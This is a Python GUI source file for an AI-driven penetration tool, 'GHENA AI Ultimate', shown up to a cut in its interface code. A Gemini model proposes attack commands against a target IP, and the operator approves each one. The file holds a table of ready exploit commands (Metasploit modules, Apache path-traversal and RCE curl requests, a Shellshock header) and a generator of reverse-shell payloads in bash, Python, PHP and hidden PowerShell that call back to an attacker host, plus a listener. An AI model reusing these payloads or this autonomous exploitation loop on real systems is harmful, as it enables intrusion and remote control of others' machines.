#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘                    GHENA AI ULTIMATE v36.0                    â•‘
â•‘         Ø§Ù„Ø°ÙƒØ§Ø¡ Ø§Ù„Ø§ØµØ·Ù†Ø§Ø¹ÙŠ Ù„Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„Ø§Ø®ØªØ±Ø§Ù‚ Ø§Ù„Ø£Ø®Ù„Ø§Ù‚ÙŠ            â•‘
â•‘                    Ø¨Ù‚Ù„Ù…: Ù…Ø·ÙˆØ± Ø¹Ø±Ø¨ÙŠ                            â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

GitHub: https://github.com/yourusername/GHENA-AI-Ultimate
"""

import sys
import subprocess
import os
import json
import re
import time
import socket
import threading
import requests
from datetime import datetime
from pathlib import Path
from collections import defaultdict
import google.generativeai as genai

from PyQt6.QtWidgets import *
from PyQt6.QtCore import *
from PyQt6.QtGui import *

# ======================= Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª =======================
GEMINI_API_KEY = "AIzaSyAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"  # Ø¶Ø¹ Ù…ÙØªØ§Ø­Ùƒ Ù‡Ù†Ø§
GEMINI_MODEL = "gemini-1.5-flash"

VERSION = "36.0 Ultimate"
AUTHOR = "ARAB HACKER"
GITHUB = "https://github.com/yourusername/GHENA-AI-Ultimate"

# Ø§Ù„Ø£Ù„ÙˆØ§Ù†
COLORS = {
    "background": "#0f0f0f",
    "text": "#e0e0e0",
    "success": "#00ff00",
    "error": "#ff0000",
    "warning": "#ffff00",
    "info": "#3498db",
    "critical": "#ff4444",
    "command": "#ffaa00",
    "ai_reason": "#00ffcc",
    "shell": "#ff66ff"
}

# Ø§Ù„Ø£Ø¯ÙˆØ§Øª Ø§Ù„Ù…Ø³Ù…ÙˆØ­ Ø¨Ù‡Ø§
ALLOWED_COMMANDS = [
    "nmap", "masscan", "gobuster", "dirb", "nikto", "wpscan",
    "sqlmap", "hydra", "john", "hashcat", "msfconsole", "searchsploit",
    "enum4linux", "smbclient", "netcat", "nc", "wireshark", "tshark",
    "curl", "wget", "openssl", "ssh", "python3", "perl", "php",
    "nuclei", "httpx", "ffuf", "wfuzz", "crackmapexec", "impacket"
]

# Ø§Ù„Ø£ÙˆØ§Ù…Ø± Ø§Ù„Ù…Ø­Ø¸ÙˆØ±Ø©
BLOCKED_PATTERNS = [
    "rm -rf /", "mkfs", "dd if=", "> /dev/sda", "format",
    "diskpart", "fdisk", "mv /* /dev/null", ":(){ :|:& };:"
]

# ======================= Ù‚Ø§Ø¹Ø¯Ø© Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø«ØºØ±Ø§Øª =======================
VULNERABILITY_DB = {
    # FTP
    "vsftpd 2.3.4": {
        "cve": "CVE-2011-2523",
        "name": "vsFTPd 2.3.4 Backdoor",
        "type": "backdoor",
        "cvss": 9.8,
        "command": "msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOST {ip}; run'",
        "description": "Ø¨Ø§Ø¨ Ø®Ù„ÙÙŠ ÙÙŠ vsFTPd ÙŠØ³Ù…Ø­ Ø¨ØªÙ†ÙÙŠØ° Ø£ÙˆØ§Ù…Ø±"
    },
    
    # Apache
    "apache 2.4.49": {
        "cve": "CVE-2021-41773",
        "name": "Apache Path Traversal",
        "type": "path traversal",
        "cvss": 7.5,
        "command": "curl -s 'http://{ip}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'",
        "description": "Ø«ØºØ±Ø© Ø¹Ø¨ÙˆØ± Ø§Ù„Ù…Ø³Ø§Ø± ÙÙŠ Apache"
    },
    "apache 2.4.50": {
        "cve": "CVE-2021-42013",
        "name": "Apache RCE",
        "type": "rce",
        "cvss": 9.8,
        "command": "curl -s 'http://{ip}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh' -d 'echo; id'",
        "description": "ØªÙ†ÙÙŠØ° Ø£ÙˆØ§Ù…Ø± Ø¹Ù† Ø¨Ø¹Ø¯ ÙÙŠ Apache"
    },
    
    # Samba
    "samba 3.5.0": {
        "cve": "CVE-2017-7494",
        "name": "SambaCry",
        "type": "rce",
        "cvss": 9.8,
        "command": "msfconsole -q -x 'use exploit/linux/samba/is_known_pipename; set RHOST {ip}; run'",
        "description": "Ø«ØºØ±Ø© SambaCry Ø§Ù„Ø´Ù‡ÙŠØ±Ø©"
    },
    
    # Shellshock
    "bash 4.3": {
        "cve": "CVE-2014-6271",
        "name": "Shellshock",
        "type": "rce",
        "cvss": 10.0,
        "command": "curl -H 'User-Agent: () { :; }; echo; /bin/bash -c \"id\"' http://{ip}/cgi-bin/test",
        "description": "Ø«ØºØ±Ø© Shellshock ÙÙŠ Bash"
    },
    
    # Heartbleed
    "openssl 1.0.1": {
        "cve": "CVE-2014-0160",
        "name": "Heartbleed",
        "type": "information disclosure",
        "cvss": 7.5,
        "command": "nmap -sV --script ssl-heartbleed {ip} -p 443",
        "description": "Ø«ØºØ±Ø© Heartbleed ÙÙŠ OpenSSL"
    },
    
    # Tomcat
    "tomcat 8.5.0": {
        "cve": "CVE-2017-12617",
        "name": "Tomcat RCE",
        "type": "rce",
        "cvss": 8.1,
        "command": "msfconsole -q -x 'use exploit/multi/http/tomcat_jsp_upload_bypass; set RHOST {ip}; run'",
        "description": "ØªÙ†ÙÙŠØ° Ø£ÙˆØ§Ù…Ø± ÙÙŠ Tomcat"
    },
    
    # WordPress
    "wordpress 5.8": {
        "cve": "CVE-2021-24499",
        "name": "WordPress RCE",
        "type": "rce",
        "cvss": 9.0,
        "command": "wpscan --url http://{ip} --enumerate vp",
        "description": "Ø«ØºØ±Ø© ÙÙŠ Ø¥Ø¶Ø§ÙØ§Øª WordPress"
    },
    
    # Jenkins
    "jenkins 2.0": {
        "cve": "CVE-2018-1000861",
        "name": "Jenkins RCE",
        "type": "rce",
        "cvss": 9.8,
        "command": "msfconsole -q -x 'use exploit/multi/http/jenkins_metaprogramming; set RHOST {ip}; run'",
        "description": "ØªÙ†ÙÙŠØ° Ø£ÙˆØ§Ù…Ø± ÙÙŠ Jenkins"
    }
}

# ======================= Ø§Ù„Ø¹Ù‚Ù„ Ø§Ù„Ø§ØµØ·Ù†Ø§Ø¹ÙŠ =======================
class AutonomousBrain(QThread):
    """Ø§Ù„Ø¹Ù‚Ù„ Ø§Ù„Ù…Ø¯Ø¨Ø± Ù„Ù„Ù‡Ø¬ÙˆÙ…"""
    
    log_signal = pyqtSignal(str, str)
    ask_permission_signal = pyqtSignal(str, str, str)  # cmd, reason, priority
    status_signal = pyqtSignal(str)
    finding_signal = pyqtSignal(dict)
    shell_signal = pyqtSignal(str, int)

    def __init__(self, target_ip, goal, attack_mode="auto", speed="normal"):
        super().__init__()
        self.ip = target_ip
        self.goal = goal
        self.attack_mode = attack_mode
        self.speed = speed
        self.mutex = QMutex()
        self.condition = QWaitCondition()
        self.approved = False
        self.history = []
        self.findings = []
        self.open_ports = []
        self.services = {}
        self.start_time = datetime.now()
        
        # ØªÙ‡ÙŠØ¦Ø© Gemini
        genai.configure(api_key=GEMINI_API_KEY)
        self.model = genai.GenerativeModel(GEMINI_MODEL)
        
    def approve_command(self):
        self.approved = True
        self.condition.wakeAll()
        
    def reject_command(self):
        self.approved = False
        self.condition.wakeAll()
        
    def is_command_safe(self, cmd):
        """Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø£Ù…Ø§Ù† Ø§Ù„Ø£Ù…Ø±"""
        cmd_lower = cmd.lower()
        
        for pattern in BLOCKED_PATTERNS:
            if pattern in cmd_lower:
                return False, f"Ø£Ù…Ø± Ù…Ø­Ø¸ÙˆØ±: {pattern}"
        
        cmd_parts = cmd_lower.split()
        if cmd_parts and cmd_parts[0] not in ALLOWED_COMMANDS:
            if not any(cmd_lower.startswith(allow) for allow in ALLOWED_COMMANDS):
                return False, f"Ø£Ø¯Ø§Ø© ØºÙŠØ± Ù…Ø³Ù…ÙˆØ­ Ø¨Ù‡Ø§: {cmd_parts[0]}"
            
        return True, "Ø¢Ù…Ù†"
        
    def execute_cmd(self, cmd):
        """ØªÙ†ÙÙŠØ° Ø£Ù…Ø± Ø§Ù„Ù†Ø¸Ø§Ù…"""
        try:
            is_safe, message = self.is_command_safe(cmd)
            if not is_safe:
                return f"âš ï¸ ØªÙ… Ø±ÙØ¶ Ø§Ù„Ø£Ù…Ø±: {message}"
            
            self.log_signal.emit(f"âš¡ ØªÙ†ÙÙŠØ°: {cmd}", "command")
            
            result = subprocess.check_output(
                cmd, 
                shell=True, 
                stderr=subprocess.STDOUT, 
                text=True, 
                timeout=600
            )
            
            self.check_for_success(result, cmd)
            return result
            
        except subprocess.TimeoutExpired:
            return "Ø®Ø·Ø£: ØªØ¬Ø§ÙˆØ² Ø§Ù„ÙˆÙ‚Øª Ø§Ù„Ù…Ø­Ø¯Ø¯"
        except subprocess.CalledProcessError as e:
            return f"Ø®Ø·Ø£: {e.output}"
        except Exception as e:
            return f"Ø®Ø·Ø£ ØªÙ†ÙÙŠØ°: {str(e)}"
            
    def check_for_success(self, output, cmd):
        """Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ø¹Ù„Ø§Ù…Ø§Øª Ø§Ù„Ù†Ø¬Ø§Ø­"""
        indicators = {
            "root": {
                "pattern": r"root:|# ",
                "severity": "CRITICAL",
                "title": "ğŸ”“ ØªÙ… Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ ØµÙ„Ø§Ø­ÙŠØ§Øª Ø§Ù„Ø¬Ø°Ø±!"
            },
            "flag": {
                "pattern": r"flag\{[^}]+\}|FLAG\{[^}]+\}",
                "severity": "CRITICAL",
                "title": "ğŸ¯ ØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ Ø§Ù„Ø¹Ù„Ù… (Flag)!"
            },
            "password": {
                "pattern": r"password:?\s+\S+|pass:?\s+\S+",
                "severity": "HIGH",
                "title": "ğŸ”‘ ØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ ÙƒÙ„Ù…Ø© Ù…Ø±ÙˆØ±"
            },
            "hash": {
                "pattern": r"\$[126]\$|\$[py]\$",
                "severity": "HIGH",
                "title": "ğŸ” ØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ Hash"
            }
        }
        
        for key, indicator in indicators.items():
            if re.search(indicator["pattern"], output, re.IGNORECASE):
                finding = {
                    "severity": indicator["severity"],
                    "title": indicator["title"],
                    "description": f"ØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ {key}",
                    "command": cmd,
                    "output": output[:300],
                    "time": datetime.now().isoformat()
                }
                self.findings.append(finding)
                self.finding_signal.emit(finding)
                
    def extract_ports(self, output):
        """Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ù…Ù†Ø§ÙØ° Ù…Ù† Ù…Ø®Ø±Ø¬Ø§Øª nmap"""
        ports = []
        pattern = r"(\d+)/tcp\s+open\s+(\S+)"
        matches = re.findall(pattern, output)
        for port, service in matches:
            ports.append(int(port))
            self.services[int(port)] = service
            
            # Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ø«ØºØ±Ø§Øª
            vuln = VULNERABILITY_DB.get(f"{service} {self.get_version(output, port)}")
            if vuln:
                self.finding_signal.emit({
                    "severity": "HIGH",
                    "title": f"ğŸ¯ Ø«ØºØ±Ø© Ù…Ø¹Ø±ÙˆÙØ©: {vuln['name']}",
                    "description": vuln['description'],
                    "command": vuln['command'].format(ip=self.ip),
                    "cve": vuln['cve'],
                    "cvss": vuln['cvss']
                })
                
        return ports
        
    def get_version(self, output, port):
        """Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ø¥ØµØ¯Ø§Ø± Ù…Ù† nmap"""
        pattern = rf"{port}/tcp.*?(\d+\.\d+\.\d+|\d+\.\d+)"
        match = re.search(pattern, output)
        return match.group(1) if match else ""
        
    def think(self):
        """Ø§Ø³ØªØ´Ø§Ø±Ø© Ø§Ù„Ø°ÙƒØ§Ø¡ Ø§Ù„Ø§ØµØ·Ù†Ø§Ø¹ÙŠ"""
        
        history_summary = []
        for step in self.history[-5:]:
            history_summary.append({
                "step": step["step"],
                "cmd": step["cmd"],
                "result": step["result"][:200]
            })
        
        ports_info = f"Ø§Ù„Ù…Ù†Ø§ÙØ° Ø§Ù„Ù…ÙØªÙˆØ­Ø©: {self.open_ports}" if self.open_ports else "Ù„Ù… ÙŠØªÙ… Ø§ÙƒØªØ´Ø§Ù Ù…Ù†Ø§ÙØ° Ø¨Ø¹Ø¯"
        
        prompt = f"""
        Ø£Ù†Øª Ø®Ø¨ÙŠØ± Ø£Ù…Ù† Ø³ÙŠØ¨Ø±Ø§Ù†ÙŠ Ù…Ø­ØªØ±Ù ÙÙŠ Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„Ø§Ø®ØªØ±Ø§Ù‚.
        
        ğŸ¯ Ø§Ù„Ù‡Ø¯Ù: {self.ip}
        ğŸ“Š Ø§Ù„Ù…Ù†Ø§ÙØ°: {ports_info}
        ğŸ” Ø§Ù„Ø®Ø¯Ù…Ø§Øª: {json.dumps(self.services, ensure_ascii=False)}
        ğŸš€ Ø§Ù„ÙˆØ¶Ø¹: {self.attack_mode}
        
        Ø¢Ø®Ø± Ø§Ù„Ù†ØªØ§Ø¦Ø¬:
        {json.dumps(history_summary, indent=2, ensure_ascii=False)}
        
        Ø§Ù„Ù…Ø·Ù„ÙˆØ¨:
        1. ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ù†ØªØ§Ø¦Ø¬ Ø¨Ø¯Ù‚Ø©
        2. Ø§Ù‚ØªØ±Ø§Ø­ Ø§Ù„Ø®Ø·ÙˆØ© Ø§Ù„ØªØ§Ù„ÙŠØ© Ø§Ù„Ù…Ù†Ø·Ù‚ÙŠØ©
        3. Ø°ÙƒØ± Ø§Ù„Ø£Ø¯Ø§Ø© Ø§Ù„Ù…Ù†Ø§Ø³Ø¨Ø©
        4. ØªÙˆØ¶ÙŠØ­ Ø§Ù„Ø³Ø¨Ø¨ (Ø¨Ø§Ù„Ø¹Ø±Ø¨ÙŠØ©)
        
        ØµÙŠØºØ© Ø§Ù„Ø±Ø¯:
        Ø§Ù„ØªØ­Ù„ÙŠÙ„: [ØªØ­Ù„ÙŠÙ„ Ø¹Ù…ÙŠÙ‚]
        Ø§Ù„Ø®Ø·Ø©: [Ø§Ù„Ø§Ø³ØªØ±Ø§ØªÙŠØ¬ÙŠØ©]
        Ø§Ù„Ø£Ù…Ø±: [Ø£Ù…Ø± ÙˆØ§Ø­Ø¯]
        Ø§Ù„Ø£ÙˆÙ„ÙˆÙŠØ©: [Ø¹Ø§Ù„ÙŠØ©/Ù…ØªÙˆØ³Ø·Ø©/Ù…Ù†Ø®ÙØ¶Ø©]
        """
        
        try:
            response = self.model.generate_content(prompt)
            text = response.text
            
            analysis = re.search(r"Ø§Ù„ØªØ­Ù„ÙŠÙ„:\s*(.+?)(?=Ø§Ù„Ø®Ø·Ø©:|$)", text, re.DOTALL)
            plan = re.search(r"Ø§Ù„Ø®Ø·Ø©:\s*(.+?)(?=Ø§Ù„Ø£Ù…Ø±:|$)", text, re.DOTALL)
            command = re.search(r"Ø§Ù„Ø£Ù…Ø±:\s*(.+?)(?=Ø§Ù„Ø£ÙˆÙ„ÙˆÙŠØ©:|$)", text, re.DOTALL)
            priority = re.search(r"Ø§Ù„Ø£ÙˆÙ„ÙˆÙŠØ©:\s*(.+?)(?=$)", text, re.DOTALL)
            
            return {
                "REASON": analysis.group(1).strip() if analysis else "ØªØ­Ù„ÙŠÙ„ ØºÙŠØ± Ù…ØªÙˆÙØ±",
                "COMMAND": command.group(1).strip() if command else "nmap -sV -T4 {self.ip}",
                "PRIORITY": priority.group(1).strip() if priority else "Ù…ØªÙˆØ³Ø·Ø©"
            }
            
        except Exception as e:
            self.log_signal.emit(f"âš ï¸ Ø®Ø·Ø£ AI: {str(e)}", "error")
            return {
                "REASON": "Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ø®Ø·Ø© Ø§Ù„Ø§ÙØªØ±Ø§Ø¶ÙŠØ©",
                "COMMAND": f"nmap -sV -T4 {self.ip}",
                "PRIORITY": "Ø¹Ø§Ù„ÙŠØ©"
            }
            
    def run(self):
        """Ø¨Ø¯Ø¡ Ø§Ù„Ù‡Ø¬ÙˆÙ…"""
        
        current_cmd = f"nmap -sV -T4 {self.ip}"
        reason = "Ø¨Ø¯Ø¡ Ø§Ø³ØªÙƒØ´Ø§Ù Ø§Ù„Ù‡Ø¯Ù"
        priority = "Ø¹Ø§Ù„ÙŠØ©"
        
        for step in range(1, 20):
            self.ask_permission_signal.emit(current_cmd, reason, priority)
            
            self.mutex.lock()
            self.condition.wait(self.mutex)
            self.mutex.unlock()
            
            if not self.approved:
                self.log_signal.emit("â¹ï¸ ØªÙ… Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„Ù‡Ø¬ÙˆÙ…", "warning")
                break
                
            self.log_signal.emit(f"\n[Ø§Ù„Ø®Ø·ÙˆØ© {step}] ØªÙ†ÙÙŠØ°: {current_cmd}", "info")
            output = self.execute_cmd(current_cmd)
            
            preview = output[:300] + "..." if len(output) > 300 else output
            self.log_signal.emit(f"ğŸ“ {preview}", "success")
            
            if "nmap" in current_cmd:
                new_ports = self.extract_ports(output)
                self.open_ports.extend(new_ports)
                if new_ports:
                    self.log_signal.emit(f"ğŸ”“ Ù…Ù†Ø§ÙØ° Ø¬Ø¯ÙŠØ¯Ø©: {new_ports}", "critical")
            
            self.history.append({
                "step": step,
                "cmd": current_cmd,
                "result": output[:500],
                "time": datetime.now().isoformat()
            })
            
            self.status_signal.emit("ğŸ§  Ø§Ù„Ø°ÙƒØ§Ø¡ Ø§Ù„Ø§ØµØ·Ù†Ø§Ø¹ÙŠ ÙŠØ­Ù„Ù„...")
            analysis = self.think()
            
            current_cmd = analysis.get("COMMAND", "DONE")
            reason = analysis.get("REASON", "Ø§ÙƒØªÙ…Ù„Øª Ø§Ù„Ù…Ù‡Ù…Ø©")
            priority = analysis.get("PRIORITY", "Ù…ØªÙˆØ³Ø·Ø©")
            
            self.log_signal.emit(f"ğŸ¤” {reason}", "ai_reason")
            
            if "DONE" in current_cmd.upper():
                self.log_signal.emit("\nğŸ¯ Ø§ÙƒØªÙ…Ù„Øª Ø§Ù„Ù…Ù‡Ù…Ø©!", "success")
                break
                
            self.approved = False
            
        self.save_report()
        
    def save_report(self):
        """Ø­ÙØ¸ Ø§Ù„ØªÙ‚Ø±ÙŠØ±"""
        report = {
            "target": self.ip,
            "goal": self.goal,
            "start": self.start_time.isoformat(),
            "end": datetime.now().isoformat(),
            "steps": len(self.history),
            "findings": self.findings,
            "ports": self.open_ports,
            "services": self.services,
            "history": self.history
        }
        
        filename = f"GHENA_Report_{self.ip}_{int(time.time())}.json"
        with open(filename, "w", encoding='utf-8') as f:
            json.dump(report, f, ensure_ascii=False, indent=2)
            
        self.log_signal.emit(f"ğŸ“Š ØªÙ… Ø­ÙØ¸ Ø§Ù„ØªÙ‚Ø±ÙŠØ±: {filename}", "info")


# ======================= Ù…Ø¯ÙŠØ± Ø§Ù„Ù€ Reverse Shell =======================
class ShellManager:
    """Ø¥Ø¯Ø§Ø±Ø© Ø§Ù„Ù€ Reverse Shells"""
    
    def __init__(self):
        self.listeners = {}
        self.active = {}
        
    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
            
    def generate_payload(self, os_type="linux", lhost=None, lport=4444):
        if lhost is None:
            lhost = self.get_local_ip()
            
        payloads = {
            "linux": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "linux_python": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "php": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "windows": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""
        }
        
        return payloads.get(os_type, payloads["linux"])
        
    def start_listener(self, port=4444, callback=None):
        def listen():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind(('0.0.0.0', port))
                s.listen(1)
                
                if callback:
                    callback(f"âœ… Ø§Ø³ØªÙ…Ø§Ø¹ Ø¹Ù„Ù‰ Ø§Ù„Ù…Ù†ÙØ° {port}")
                
                client, addr = s.accept()
                if callback:
                    callback(f"ğŸ”Œ Ø§ØªØµØ§Ù„ Ù…Ù† {addr[0]}:{addr[1]}")
                
                self.active[port] = client
                
                while True:
                    data = client.recv(1024).decode()
                    if not data:
                        break
                    if callback:
                        callback(f"ğŸ“¨ {data}")
                        
            except Exception as e:
                if callback:
                    callback(f"âŒ Ø®Ø·Ø£: {e}")
                    
        thread = threading.Thread(target=listen)
        thread.daemon = True
        thread.start()
        self.listeners[port] = thread
        return port


# ======================= Ø§Ù„ÙˆØ§Ø¬Ù‡Ø© Ø§Ù„Ø±Ø³ÙˆÙ…ÙŠØ© =======================
class GhenaAIUltimate(QMainWindow):
    def __init__(self):
        super().__init__()
        self.brain = None
        self.shell_manager = ShellManager()
        self.setup_ui()
        
    def setup_ui(self):
        """Ø¥Ø¹Ø¯Ø§Ø¯ Ø§Ù„ÙˆØ§Ø¬Ù‡Ø©"""
        self.setWindowTitle(f"GHENA AI ULTIMATE v{VERSION}")
        self.setMinimumSize(1200, 900)
        
        # Ø§Ù„ØªØ·Ø¨ÙŠÙ‚ Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠ
        main_widget = QWidget()
        self.setCentralWidget(main_widget)
        layout = QVBoxLayout(main_widget)
        
        # ========== Ø§Ù„Ø´Ø±ÙŠØ· Ø§Ù„Ø¹Ù„ÙˆÙŠ ==========
        top_bar = QHBoxLayout()
        
        # Ø¹Ù†ÙˆØ§Ù†
        title = QLabel(f"ğŸ§  GHENA AI v{VERSION}")
        title.setStyleSheet("font-size: 20px; font-weight: bold; color: #00ffcc;")
        top_bar.addWidget(title)
        
        top_bar.addStretch()
        
        # Ø²Ø± GitHub
        github_btn = QPushButton("â­ GitHub")
        github_btn.clicked.connect(lambda: QDesktopServices.openUrl(QUrl(GITHUB)))
        top_bar.addWidget(github_btn)
        
        layout.addLayout(top_bar)
        
        # ========== Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ù‡Ø¬ÙˆÙ… ==========
        attack_group = QGroupBox("ğŸ¯ Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ù‡Ø¬ÙˆÙ…")
        attack_group.setStyleSheet("QGroupBox { color: #00ffcc; }")
        attack_layout = QHBoxLayout()
        
        self.ip_input = QLineEdit()
        self.ip_input.setPlaceholderText("Ø£Ø¯Ø®Ù„ IP Ø§Ù„Ù‡Ø¯Ù (Ù…Ø«Ø§Ù„: 10.10.10.10)")
        self.ip_input.setStyleSheet("padding: 8px; background: #1a1a1a; border: 1px solid #333;")
        
        self.goal_combo = QComboBox()
        self.goal_combo.addItems(["ğŸ”“ Root Access", "ğŸŒ User Flag", "ğŸŒ Network Access", "ğŸ”‘ Passwords", "ğŸ“ Files"])
        
        self.mode_combo = QComboBox()
        self.mode_combo.addItems(["ğŸ¤– Auto", "ğŸŒ Web", "ğŸ” Password", "ğŸ“¡ Network", "ğŸªŸ Windows", "ğŸ§ Linux"])
        
        self.speed_combo = QComboBox()
        self.speed_combo.addItems(["ğŸ¢ Stealth", "âš¡ Normal", "ğŸš€ Aggressive"])
        
        self.start_btn = QPushButton("ğŸš€ Ø¨Ø¯Ø¡ Ø§Ù„Ù‡Ø¬ÙˆÙ…")
        self.start_btn.setStyleSheet("""
            QPushButton {
                background: #8e44ad;
                color: white;
                padding: 10px;
                font-weight: bold;
                border-radius: 5px;
            }
            QPushButton:hover {
                background: #9b59b6;
            }
        """)
        self.start_btn.clicked.connect(self.start_attack)
        
        attack_layout.addWidget(QLabel("IP:"))
        attack_layout.addWidget(self.ip_input)
        attack_layout.addWidget(QLabel("Ø§Ù„Ù‡Ø¯Ù:"))
        attack_layout.addWidget(self.goal_combo)
        attack_layout.addWidget(QLabel("Ø§Ù„ÙˆØ¶Ø¹:"))
        attack_layout.addWidget(self.mode_combo)
        attack_layout.addWidget(QLabel("Ø§Ù„Ø³Ø±Ø¹Ø©:"))
        attack_layout.addWidget(self.speed_combo)
        attack_layout.addWidget(self.start_btn)
        
        attack_group.setLayout(attack_layout)
        layout.addWidget(attack_group)
        
        # ========== Ù‚Ø±Ø§Ø± Ø§Ù„Ø°ÙƒØ§Ø¡ Ø§Ù„Ø§ØµØ·Ù†Ø§Ø¹ÙŠ ==========
        ai_group = QGroupBox("ğŸ§  Ù‚Ø±Ø§Ø± Ø§Ù„Ø°ÙƒØ§Ø¡ Ø§Ù„Ø§ØµØ·Ù†Ø§Ø¹ÙŠ")
        ai_group.setStyleSheet("QGroupBox { color: #00ffcc; border: 2px solid #00ffcc; }")
        ai_layout = QVBoxLayout()
        
        self.reason_label = QLabel("â³ Ø¨Ø§Ù†ØªØ¸Ø§Ø± ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø°ÙƒØ§Ø¡ Ø§Ù„Ø§ØµØ·Ù†Ø§Ø¹ÙŠ...")
        self.reason_label.setWordWrap(True)
        self.reason_label.setStyleSheet("color: #00ffcc; font-size: 12px; padding: 10px;")
        
        self.command_display = QLineEdit()
        self.command_display.setReadOnly(True)
        self.command_display.setStyleSheet("""
            QLineEdit {
                color: #ffaa00;
                font-family: monospace;
                font-size: 14px;
                background: #000;
                padding: 10px;
                border: 1px solid #ffaa00;
            }
        """)
        
        btn_layout = QHBoxLayout()
        
        self.approve_btn = QPushButton("âœ… Ù…ÙˆØ§ÙÙ‚Ø© ÙˆØªÙ†ÙÙŠØ°")
        self.approve_btn.setEnabled(False)
        self.approve_btn.setStyleSheet("""
            QPushButton {
                background: #27ae60;
                color: white;
                padding: 10px;
                font-weight: bold;
                border-radius: 5px;
            }
            QPushButton:hover {
                background: #2ecc71;
            }
        """)
        self.approve_btn.clicked.connect(self.approve_command)
        
        self.reject_btn = QPushButton("âŒ Ø±ÙØ¶")
        self.reject_btn.setEnabled(False)
        self.reject_btn.setStyleSheet("""
            QPushButton {
                background: #c0392b;
                color: white;
                padding: 10px;
                font-weight: bold;
                border-radius: 5px;
            }
            QPushButton:hover {
                background: #e74c3c;
            }
        """)
        self.reject_btn.clicked.connect(self.reject_command)
        
        btn_layout.addWidget(self.approve_btn)
        btn_layout.addWidget(self.reject_btn)
        
        ai_layout.addWidget(self.reason_label)
        ai_layout.addWidget(self.command_display)
        ai_layout.addLayout(btn_layout)
        
        ai_group.setLayout(ai_layout)
        layout.addWidget(ai_group)
        
        # ========== Ø£Ø¯ÙˆØ§Øª Ø¥Ø¶Ø§ÙÙŠØ© ==========
        tools_group = QGroupBox("ğŸ› ï¸ Ø£Ø¯ÙˆØ§Øª Ø¥Ø¶Ø§ÙÙŠØ©")
        tools_layout = QHBoxLayout()
        
        self.shell_btn = QPushButton("ğŸ”Œ Ø¨Ø¯Ø¡ Reverse Shell")
        self.shell_btn.clicked.connect(self.start_shell)
        
        self.report_btn = QPushButton("ğŸ“Š Ø¹Ø±Ø¶ Ø§Ù„ØªÙ‚Ø§Ø±ÙŠØ±")
        self.report_btn.clicked.connect(self.show_reports)
        
        self.clear_btn = QPushButton("ğŸ§¹ Ù…Ø³Ø­ Ø§Ù„Ø´Ø§Ø´Ø©")
        self.clear_btn.clicked.connect(lambda: self.console.clear())
        
        tools_layout.addWidget(self.shell_btn)
        tools_layout.addWidget(self.report_btn)
        tools_layout.addWidget(self.clear_btn)
        tools_layout.addStretch()
        
        tools_group.setLayout(tools_layout)
        layout.addWidget(tools_group)
        
        # ========== Ø§Ù„Ø´Ø§Ø´Ø© Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ© ==========
        tab_widget = QTabWidget()
        
        # ØªØ¨ÙˆÙŠØ¨ Ø§Ù„Ø¥Ø®Ø±Ø§Ø¬
        self.console = QTextEdit()
        self.console.setReadOnly(True)
